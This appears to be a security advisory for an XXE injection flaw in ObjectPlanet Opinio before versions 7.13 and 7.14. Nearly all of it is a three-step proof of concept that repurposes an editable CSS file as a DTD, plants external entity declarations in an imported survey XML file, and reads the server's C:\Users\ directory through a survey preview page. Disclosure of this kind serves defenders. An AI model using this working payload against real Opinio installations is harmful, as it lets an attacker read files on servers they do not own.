# 1. Introduction
Opinio is a survey management solution by ObjectPlanet that allows surveys to be designed, published and managed.

# 2. Vulnerability Details
ObjectPlanet Opinio before version 7.13 and 7.14 is vulnerable to XXE injection.

# 3. Proof of Concept

### XXE leading to local file disclosure ###

Step 1: 

URL: /opinio/admin/file.do?action=viewEditFileResource&resourceType=6&resourcePatch=upload/css/common/blueSurvey.css

Opinio allows an administrative user to edit local CSS files, this is used to change the contents of a CSS file to a dtd reference file for the XXE injection
The existing blueSurvey.css file was chosen for this PoC. Replace the contents of the file with:  

<!ENTITY all "%start;%file;%end;">

-------------------------------------------------------

Step 2: 

Utilize Opinios survey module and create a generic survey template. Export the template .xml file and add this snippet into the top of the .xml file:

<!ENTITY % file SYSTEM "file:////C:\Users\">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM
"file:////C:\<BASE_DIRECTORY>\opinio\upload\css\common\blueSurvey.css">
%dtd;

Ensure the surveyIntro tag is inserted with the following payload (This will output the result in the
surveyIntro field):

<surveyIntro>&all;</surveyIntro>

The base directory can be guessed via the information under Setup >> Edit System Settings , this page on Opinio shows the local directory of where Opinio was installed to. 

Import the modified .xml file to: 
/survey/admin/folderSurvey.do?action=viewImportSurvey['importFile']

-------------------------------------------------------

Step 3: 

The C:\Users\ directory can be viewed at :
/opinio/admin/preview.do?action=previewSurvey&surveyId=<SURVEY_ID>
